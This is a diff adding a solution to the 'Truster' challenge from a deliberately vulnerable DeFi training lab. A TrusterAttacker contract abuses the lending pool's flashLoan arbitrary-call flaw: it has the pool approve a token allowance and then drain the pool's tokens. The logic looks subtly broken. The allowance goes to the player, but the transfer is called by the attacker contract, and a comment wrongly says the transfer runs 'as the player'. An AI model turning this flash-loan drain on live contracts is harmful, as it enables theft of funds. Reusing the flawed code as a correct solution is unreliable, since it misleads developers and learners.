@@ -50,8 +50,11 @@ contract TrusterChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+
+
     function test_truster() public checkSolvedByPlayer {
-        
+        // Deploy the attacker contract as the player, which will perform the exploit in its constructor
+        new TrusterAttacker(pool, token, recovery, player, TOKENS_IN_POOL);
     }
 
     /**
@@ -66,3 +69,33 @@ contract TrusterChallenge is Test {
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
 }
+
+
+
+    contract TrusterAttacker {
+        constructor(
+            TrusterLenderPool pool,
+            DamnValuableToken token,
+            address recovery,
+            address player,
+            uint256 amount
+        ) {
+            // Craft the approval call
+            bytes memory data = abi.encodeWithSignature(
+                "approve(address,uint256)",
+                player,
+                amount
+            );
+
+            // Call flashLoan to make the pool approve the player
+            pool.flashLoan(
+                0,
+                player,
+                address(token),
+                data
+            );
+
+            // Now, as the player, transfer all tokens from the pool to the recovery address
+            token.transferFrom(address(pool), recovery, amount);
+        }
+    }
